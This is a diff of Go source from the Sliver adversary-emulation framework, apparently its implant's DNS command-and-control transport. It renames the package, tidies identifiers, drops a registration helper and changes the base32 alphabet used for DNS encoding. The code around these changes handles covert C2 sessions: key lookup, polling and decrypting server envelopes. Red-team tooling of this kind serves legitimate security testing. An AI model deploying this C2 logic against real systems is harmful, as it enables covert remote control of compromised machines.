@@ -1,4 +1,4 @@
-package main
+package transports
 
 // {{if .DNSParent}}
 
@@ -26,6 +26,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	consts "sliver/sliver/constants"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -231,7 +233,7 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 
 // Get the public key of the server
 func dnsGetServerPublicKey() *rsa.PublicKey {
-	pubKeyPEM, err := LookupDomainKey(sliverName, dnsParent)
+	pubKeyPEM, err := LookupDomainKey(consts.SliverName, dnsParent)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("Failed to fetch domain key %v", err)
@@ -370,17 +372,17 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 
 // Poll returned the server has a message for us, fetch the entire envelope
 func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNSBlockHeader) *pb.Envelope {
-	blockData, err := getBlock(parentDomain, blockPtr.Id, fmt.Sprintf("%d", blockPtr.Size))
+	blockData, err := getBlock(parentDomain, blockPtr.ID, fmt.Sprintf("%d", blockPtr.Size))
 	if err != nil || isReplayAttack(blockData) {
 		// {{if .Debug}}
-		log.Printf("Failed to fetch block with id = %s", blockPtr.Id)
+		log.Printf("Failed to fetch block with id = %s", blockPtr.ID)
 		// {{end}}
 		return nil
 	}
 	envelopeData, err := GCMDecrypt(sessionKey, blockData)
 	if err != nil {
 		// {{if .Debug}}
-		log.Printf("Failed to decrypt block with id = %s (%v)", blockPtr.Id, err)
+		log.Printf("Failed to decrypt block with id = %s (%v)", blockPtr.ID, err)
 		// {{end}}
 		return nil
 	}
@@ -483,14 +485,6 @@ func fetchBlockSegments(parentDomain string, reasm *BlockReassembler, index int,
 
 // --------------------------- HELPERS ---------------------------
 
-func dnsRegisterSliver(send chan *pb.Envelope) {
-	// {{if .Debug}}
-	log.Printf("Sending registration information ...")
-	// {{end}}
-	registerEnvelope := getRegisterSliver()
-	send <- registerEnvelope
-}
-
 func dnsBlockHeaderID() string {
 	insecureRand.Seed(time.Now().UnixNano())
 	blockID := []rune{}
@@ -520,7 +514,7 @@ func fingerprintSHA256(block *pem.Block) string {
 
 // --------------------------- ENCODER ---------------------------
 
-var base32Alphabet = "0123456789abcdefghjkmnpqrtuvwxyz"
+var base32Alphabet = "a0b1c2d3e4f5g6h7j8k9mnpqrtuvwxyz"
 var sliverBase32 = base32.NewEncoding(base32Alphabet)
 
 // EncodeToString encodes the given byte slice in base32
